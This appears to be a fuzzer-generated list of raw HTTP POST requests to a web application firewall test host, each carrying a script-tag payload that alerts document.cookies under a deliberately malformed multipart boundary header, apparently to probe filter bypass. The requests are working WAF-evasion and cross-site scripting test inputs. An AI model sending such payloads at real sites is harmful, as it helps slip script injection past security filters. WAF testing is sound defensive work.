POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 856\r\nContent-Type: multipart/form-data; boundaOyboundary=b_undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 920\r\nContent-Type: multipart/form-data; ==bound\x00ry==Goandary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 984\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 28\r\nContent-Type: multipart/form-data; boundary=bondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 92\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 156\r\nContent-Type: multipart/form-data; bondaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 220\r\nContent-Type: multipart/form-data; bondary=bou\x1bary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 284\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 348\r\nContent-Type: multipart/form-data; |boud\raryb`undary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 412\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 476\r\nContent-Type: multipart/form-data; boundaryboundaT0ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 540\r\nContent-Type: multipart/form-data; 0bound\x05ryboundarybounary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 604\r\nContent-Type: multipart/form-data; boundaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 668\r\nContent-Type: multipart/form-data; ===boundway;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 732\r\nContent-Type: multipart/form-data; bun\xc2\xbbaOy==u$ndaytound7ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 796\r\nContent-Type: multipart/form-data; =b\x01Hundrc;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 860\r\nContent-Type: multipart/form-data; boundaryboundary=boundar\x1dy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 924\r\nContent-Type: multipart/form-data; bo\x08unday=bound\x19y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 988\r\nContent-Type: multipart/form-data; boun1aryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 50\r\nContent-Type: multipart/form-data; boundarybouXdry=boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 114\r\nContent-Type: multipart/form-data; boundary=bBJudary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 178\r\nContent-Type: multipart/form-data; boundary=bou`ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 242\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 306\r\nContent-Type: multipart/form-data; boundaryNbou\x07aryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 370\r\nContent-Type: multipart/form-data; boundary=bounKdary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 434\r\nContent-Type: multipart/form-data; fboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 498\r\nContent-Type: multipart/form-data; bov\x1fdaF=bodsry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 562\r\nContent-Type: multipart/form-data; boundary=5boundarb\x07oundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 626\r\nContent-Type: multipart/form-data; boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 690\r\nContent-Type: multipart/form-data; boundary==bo\xc2\xabndarg\t2;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 754\r\nContent-Type: multipart/form-data; =boPndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 818\r\nContent-Type: multipart/form-data; b?undahxy boundaryboundaryboundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 882\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 946\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 32\r\nContent-Type: multipart/form-data; boundary=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 96\r\nContent-Type: multipart/form-data; boundarybound\x0bvry=boundarybo@ndary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 160\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 224\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 288\r\nContent-Type: multipart/form-data; boundaryboundary:oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 352\r\nContent-Type: multipart/form-data; boundaryboundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 416\r\nContent-Type: multipart/form-data; boundaryboundaryboundOry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 480\r\nContent-Type: multipart/form-data; boundary)oundary=vounydary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 544\r\nContent-Type: multipart/form-data; boundRIarybound\x19ary=}\x0foundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 608\r\nContent-Type: multipart/form-data; boundary=boundarW.y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 672\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 736\r\nContent-Type: multipart/form-data; boundaryYoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 800\r\nContent-Type: multipart/form-data; boundaryboundaryboundqy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 864\r\nContent-Type: multipart/form-data; boundaryboudaryboundarybondary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 928\r\nContent-Type: multipart/form-data; boxnary=b}Hundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 992\r\nContent-Type: multipart/form-data; ubounaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 22\r\nContent-Type: multipart/form-data; boundaryboundaryboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 86\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 150\r\nContent-Type: multipart/form-data; bou\x06aryboundary==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 214\r\nContent-Type: multipart/form-data; boundar:yboundary=`ounR\x19ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 278\r\nContent-Type: multipart/form-data; bo.nar=boundar.y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 342\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 406\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 470\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 534\r\nContent-Type: multipart/form-data; \x16nda\x01y=;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 598\r\nContent-Type: multipart/form-data; boundary=b;oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 662\r\nContent-Type: multipart/form-data; boundaryboundarybo/unarRy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 726\r\nContent-Type: multipart/form-data; bo\nnda\t/y=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 790\r\nContent-Type: multipart/form-data; ====badundr;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 854\r\nContent-Type: multipart/form-data; boudarOy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 918\r\nContent-Type: multipart/form-data; o/unyary\x10und6qaryboudar8;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 982\r\nContent-Type: multipart/form-data; =bou6ndaBy===boundaryboundua y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 7\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 71\r\nContent-Type: multipart/form-data; =boundary=!ouaay;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 135\r\nContent-Type: multipart/form-data; ===;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 199\r\nContent-Type: multipart/form-data; bou\x03nry=bounUa?ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 263\r\nContent-Type: multipart/form-data; bou\x11nda\\y=b\roundy;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 327\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 391\r\nContent-Type: multipart/form-data; =boundar=bundar/y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 455\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 519\r\nContent-Type: multipart/form-data; boSnryboun\x02ry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 583\r\nContent-Type: multipart/form-data; boundaryb\x11)na\x06yry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 647\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 711\r\nContent-Type: multipart/form-data; bo\x0c}n\nda-y=buna\x14yboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 775\r\nContent-Type: multipart/form-data; boHn\x18dary=bundar\x0b;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 839\r\nContent-Type: multipart/form-data; boundary=pbouda7\x01yb\x19oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 903\r\nContent-Type: multipart/form-data; boundary=boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 967\r\nContent-Type: multipart/form-data; bounaybon\x0fGry;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 26\r\nContent-Type: multipart/form-data; bou~daryboundary=oundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 90\r\nContent-Type: multipart/form-data; bounary=bounar9y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 154\r\nContent-Type: multipart/form-data; bou8dary==Zoundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 218\r\nContent-Type: multipart/form-data; ou*dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 282\r\nContent-Type: multipart/form-data; bo\\n!r\x0bbo\x0fudaThy=bou"dary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 346\r\nContent-Type: multipart/form-data; b.und#r\xc2\xabboundarybondar&y;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 410\r\nContent-Type: multipart/form-data; boundary=boundaryWboundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 474\r\nContent-Type: multipart/form-data; ==boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 538\r\nContent-Type: multipart/form-data; boundaybohund_ary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 602\r\nContent-Type: multipart/form-data; =boundary;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 666\r\nContent-Type: multipart/form-data; ;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 730\r\nContent-Type: multipart/form-data; boundary\nboundar;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
POST / HTTP/1.1\r\nHost: waf.akhavani.net\r\nConnection:close\r\nX-Request-ID: 794\r\nContent-Type: multipart/form-data; boundary==;\r\nContent-Length: 114\r\n\r\n--boundary\r\nContent-Disposition: form-data; name="field1"\r\n\r\n<script>alert(document.cookies)</script>\r\n--boundary--
